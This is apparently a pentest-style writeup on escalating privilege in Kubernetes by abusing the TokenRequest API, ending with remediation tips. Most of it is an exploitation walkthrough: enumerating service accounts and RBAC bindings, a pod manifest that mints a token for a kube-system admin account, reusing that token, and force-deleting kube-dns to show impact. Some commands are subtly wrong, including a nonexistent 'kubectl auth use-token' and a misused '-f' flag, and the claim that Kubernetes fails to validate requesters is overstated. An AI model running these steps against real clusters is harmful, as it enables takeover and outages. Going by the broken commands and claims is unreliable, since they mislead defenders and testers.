
# Kubernetes TokenRequest API Abuse for Privilege Escalation

## 1. Overview Section

### Attack Vector Description

The `TokenRequest` API in Kubernetes allows a user or service account to request a short-lived token. While intended for legitimate purposes like temporary access or identity delegation, it can be abused if misconfigured or under-secured. An attacker, with minimal existing permissions (e.g., ability to create pods), can use the `TokenRequest` API to request a token impersonating a different service account with significantly higher privileges. This token can then be used to authenticate as that service account and perform actions they are authorized to do, leading to privilege escalation.

### Potential Impact and Consequences

Successful exploitation leads to full control over the targeted cluster, potentially allowing:

*   Data exfiltration from sensitive namespaces.
*   Deployment of malicious workloads.
*   Modification of Kubernetes configuration.
*   Denial-of-service attacks.
*   Lateral movement to other systems within the network.
*   Complete cluster compromise.

### Risk Level Assessment

**Critical**

### Technical Explanation

The vulnerability arises from insufficient RBAC (Role-Based Access Control) restrictions on the `TokenRequest` API. If a user or service account has permissions to create pods, and a pod is configured with a service account with access to create `TokenRequest` for another service account, this becomes exploitable. Kubernetes doesn't always adequately validate whether the requester is authorized to act on behalf of the targeted service account.

### Prerequisites and Conditions Needed

*   **Existing Access:** The attacker needs a minimal level of access to the Kubernetes cluster, such as the ability to create pods.
*   **Vulnerable Service Account:** A service account with the `create` verb on `TokenRequest` resource targeted towards the higher privilege service account must exist.
*   **Cluster Configuration:** The `TokenRequest` API feature must be enabled (it usually is by default).
*   **Target Service Account:** A service account exists with the desired elevated privileges to be impersonated. This service account should have roles bound to it that grant access to resources the attacker desires.

## 2. Validation and Exploitation Steps Section

This section demonstrates how to validate and exploit this vulnerability. We will assume the attacker has the ability to create pods and is trying to impersonate the `admin-sa` service account in the `kube-system` namespace. The attacker will first check if they can create a pod with a service account that can create TokenRequests. Then, they will request the token and use it to authenticate to the cluster.

**Phase 1: Validation**

1.  **Identify Existing Service Accounts:**

    ```bash
    kubectl get sa --all-namespaces
    ```

    *   **Explanation:** This command lists all service accounts in all namespaces.
    *   **Why:** We need to identify potential service accounts that might be exploitable or have the necessary RBAC permissions to create TokenRequests.
    *   **Expected Output:** A list of service accounts, including their namespaces. Look for service accounts with names like "default", "admin", or ones related to system components.
    *   **Validation:** The presence of multiple service accounts is a prerequisite.

2.  **Inspect RBAC for a Potentially Vulnerable Service Account (e.g., `default` in `default` namespace):**

    ```bash
    kubectl get rolebinding --all-namespaces -o yaml | grep -A 3 'kind: ServiceAccount' | grep default -B 2 -A 3
    kubectl get clusterrolebinding -o yaml | grep -A 3 'kind: ServiceAccount' | grep default -B 2 -A 3
    ```

    *   **Explanation:** These commands search through all RoleBindings and ClusterRoleBindings for references to the `default` service account in the `default` namespace.
    *   **Why:** We want to see what roles are assigned to this service account, looking for broader permissions. This step is crucial to determine the potential impact of impersonating the service account.
    *   **Expected Output:** YAML output showing RoleBindings and ClusterRoleBindings that reference the `default` service account.
    *   **Validation:** Analyze the output for roles like `cluster-admin`, `edit`, or roles with broad permissions over resources like `pods`, `deployments`, or `namespaces`.

3.  **Check if the Target Service Account (e.g., `admin-sa` in `kube-system` namespace) exists:**

    ```bash
    kubectl get sa admin-sa -n kube-system
    ```

    *   **Explanation:** Checks if the `admin-sa` service account exists in the `kube-system` namespace.
    *   **Why:** Verifies the existence of the target account.
    *   **Expected Output:** Details of the `admin-sa` service account.
    *   **Validation:** If the service account exists, proceed. If not, adjust the target service account.

4.  **Create a Pod Definition (pod.yaml) that utilizes a vulnerable Service Account and attempts to create a TokenRequest:**

    ```yaml
    apiVersion: v1
    kind: Pod
    metadata:
      name: token-request-pod
      namespace: default # Place the pod in a namespace where you have create pod access
    spec:
      serviceAccountName: default #Use the SA from the previous step or create a new one
      containers:
      - name: token-request
        image: alpine/k8s:1.27.0 #Use a k8s compatible image
        command: ["/bin/sh", "-c"]
        args:
        - |
          TOKEN=$(kubectl create token admin-sa -n kube-system --duration=1h)
          echo "Token: $TOKEN"
      restartPolicy: Never
    ```

    *   **Explanation:** This YAML file defines a pod named `token-request-pod` that runs a simple command to attempt to create a `TokenRequest` for the `admin-sa` service account in the `kube-system` namespace. The duration is set to 1 hour.
    *   **Why:** This pod is the primary tool for attempting to exploit the `TokenRequest` API. It will be deployed and then the logs will be examined for errors or success.
    *   **Important**:  This pod uses `kubectl` within the container. The service account assigned to the pod (in this case, `default`) *must* have sufficient RBAC permissions to use `kubectl` inside the container. This often involves creating a Role and RoleBinding that allows the service account to `get`, `list`, `watch`, and potentially `create` other resources within the cluster. You can adjust the image with any that has `kubectl`.  Also, the `default` service account may lack create privileges for tokenrequest resources, so an alternative approach would be to create a dedicated service account that has these rights.

5.  **Deploy the Pod:**

    ```bash
    kubectl apply -f pod.yaml
    ```

    *   **Explanation:** This command deploys the pod defined in the `pod.yaml` file.
    *   **Why:** This initiates the token request attempt.
    *   **Expected Output:**  `pod/token-request-pod created`
    *   **Validation:** The pod is deployed.

6.  **Check the Pod Logs:**

    ```bash
    kubectl logs token-request-pod
    ```

    *   **Explanation:** This command retrieves the logs from the `token-request-pod`.
    *   **Why:** This is where we'll see whether the token request was successful or if an error occurred.
    *   **Expected Output:**
        *   **Successful Token Request:** The logs will display the generated token. Look for a long string of characters.
        *   **Error (RBAC Denied):** The logs will show an error message indicating that the service account associated with the pod lacks the necessary permissions to create a `TokenRequest` for the target service account.  This would show `Error from server (Forbidden): serviceaccounts "admin-sa" is forbidden: User "system:serviceaccount:default:default" cannot create tokenrequests on serviceaccounts in the serviceaccounts.k8s.io group`
    *   **Validation:** If a token is successfully generated, it confirms that the `TokenRequest` API is exploitable. If an error occurs, the RBAC configuration is likely preventing the attack in its current form. It would be necessary to create a different service account with the right roles.

**Phase 2: Exploitation**

Assuming the token request was successful in the validation phase, we can now use the retrieved token to authenticate as the target service account (`admin-sa`) and perform actions they are authorized to do.

1. **Store the Token (Assumes token was printed in logs) :**

    ```bash
    TOKEN="<PASTE_THE_RETRIEVED_TOKEN_HERE>"
    ```

    *   **Explanation:** Assign the retrieved token to a variable named `TOKEN`.
    *   **Why:**  The token is required to authenticate as the target service account.
    *   **Expected Output:** None (assigns a variable)
    *   **Validation:** The `TOKEN` variable now contains the token.

2.  **Authenticate using the Token:**

    ```bash
    kubectl auth use-token --token="$TOKEN"
    ```

    *   **Explanation:**  Configures `kubectl` to use the retrieved token for authentication.
    *   **Why:** This allows us to act as the `admin-sa` service account.
    *   **Expected Output:** Confirmation that the context has been updated.
    *   **Validation:** `kubectl` now uses the token for authentication.

3.  **Verify Elevated Privileges:**

    ```bash
    kubectl get pods --all-namespaces
    ```

    *   **Explanation:** Lists all pods in all namespaces.
    *   **Why:** This checks if we now have access to resources that we previously didn't have access to.  Service accounts often have roles granted at namespace scope.
    *   **Expected Output:**
        *   **Successful Exploitation:** If we have successfully impersonated `admin-sa`, and `admin-sa` has the necessary permissions, we will see a list of all pods across all namespaces.  This indicates complete cluster admin rights.
        *   **Failed Exploitation:** If the permissions of `admin-sa` are limited, the command may fail, or only list a subset of pods.
    *   **Validation:**  The ability to list all pods confirms privilege escalation.

4.  **Perform a High-Impact Action (Example: Delete a Critical Pod):**

    ```bash
    kubectl delete pod -n kube-system kube-dns -f --force --grace-period=0
    ```

    *   **Explanation:** This command attempts to delete the `kube-dns` pod in the `kube-system` namespace. This is a destructive action used to demonstrate the severity of the vulnerability.  **WARNING:  This will impact the cluster's DNS resolution capabilities.**
    *   **Why:**  Demonstrates the impact of having elevated privileges.  Deleting critical system components can lead to cluster instability.
    *   **Expected Output:** The `kube-dns` pod is deleted.
    *   **Validation:**  Successful deletion confirms complete control over the cluster.

**Remediation Recommendations**

*   **Least Privilege Principle:**  The cornerstone of security. Only grant the minimal necessary permissions to service accounts and users.
*   **RBAC Hardening:**  Review and restrict RBAC permissions for all service accounts, especially the `default` service account.  Prevent service accounts from creating `TokenRequest` objects unless absolutely necessary.
*   **Pod Security Policies (PSPs) or Pod Security Admission (PSA):**  Use PSPs or PSA to restrict the capabilities of pods, including the service accounts they can use. Configure PSPs to prevent pods from using service accounts with excessive privileges. Migrate PSPs to Pod Security Admission Controller.
*   **Audit Logging:**  Enable detailed audit logging to track API requests and identify suspicious activity, including attempts to create `TokenRequest` for privileged service accounts.
*   **Regular Security Assessments:**  Conduct regular penetration testing and security audits to identify and address vulnerabilities in the Kubernetes cluster.
*   **Limit `kubectl` access inside containers:** Avoid running `kubectl` directly within containers. If needed, strictly control RBAC permissions and use alternatives like Kubernetes API clients.
*   **Namespace Isolation:** Isolate applications and workloads into separate namespaces to limit the impact of a successful exploit.
*   **Monitor `TokenRequest` usage:** Continuously monitor the use of the `TokenRequest` API to detect anomalous activity.
